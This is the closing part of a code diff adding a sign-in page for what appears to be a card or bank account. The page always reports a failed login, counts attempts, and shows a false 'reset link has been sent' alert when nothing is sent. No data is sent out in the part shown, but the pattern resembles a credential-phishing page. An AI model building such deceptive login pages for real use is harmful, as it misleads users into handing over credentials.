+        document.getElementById('usernameError').classList.remove('show');
+        document.getElementById('passwordError').classList.remove('show');
+        document.getElementById('successMessage').classList.remove('show');
+        
+        // Basic validation
+        let isValid = true;
+        
+        if (!loginId.trim()) {
+          document.getElementById('usernameError').textContent = 'Please enter your username or card number';
+          document.getElementById('usernameError').classList.add('show');
+          isValid = false;
+        }
+        
+        if (!password.trim()) {
+          document.getElementById('passwordError').textContent = 'Please enter your password';
+          document.getElementById('passwordError').classList.add('show');
+          isValid = false;
+        }
+        
+        if (!isValid) {
+          spinner.classList.remove('active');
+          buttonText.textContent = 'Sign in';
+          submitBtn.disabled = false;
+          return;
+        }
+        
+        // Simulate API delay
+        setTimeout(() => {
+          // For demo purposes, always show failed login
+          // In real implementation, this would check with backend
+          simulateFailedLogin();
+          
+          // Reset button state
+          spinner.classList.remove('active');
+          buttonText.textContent = 'Sign in';
+          submitBtn.disabled = false;
+          
+          // Add subtle vibration effect
+          if (navigator.vibrate) {
+            navigator.vibrate(200);
+          }
+          
+        }, 1500); // Simulate network delay
+      });
+      
+      // Password reset simulation
+      document.querySelectorAll('a').forEach(link => {
+        if (link.textContent.includes('Reset your password') || 
+            link.textContent.includes('Forgot your username')) {
+          link.addEventListener('click', function(e) {
+            e.preventDefault();
+            
+            // Show loading state on the clicked link
+            const originalHTML = this.innerHTML;
+            this.innerHTML = `
+              <svg class="loading active w-4 h-4 text-[#03749D]" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+                <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+                <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+              </svg>
+              <span class="text-[#03749D] text-[16px] font-[700] ml-2">Processing...</span>
+            `;
+            
+            // Simulate reset process
+            setTimeout(() => {
+              this.innerHTML = originalHTML;
+              alert('A reset link has been sent to your registered email address. Please check your inbox and follow the instructions to reset your credentials.');
+            }, 2000);
+          });
+        }
+      });
+      
+      // Help link simulation
+      document.querySelectorAll('a').forEach(link => {
+        if (link.textContent.includes('Need help signing in')) {
+          link.addEventListener('click', function(e) {
+            e.preventDefault();
+            window.location.href = 'support.html'; // Redirect to support page
+          });
+        }
+      });
+      
+      // Initialize page
+      document.addEventListener('DOMContentLoaded', () => {
+        loadAttemptCount();
+        
+        // Focus on username field
+        document.getElementById('usernameInput').focus();
+        
+        // Add visual indicator for error state
+        document.querySelectorAll('.input-icon').forEach(el => {
+          el.style.borderBottomColor = '#EB121A';
+        });
+      });
+    </script>
+  </body>
+</html>
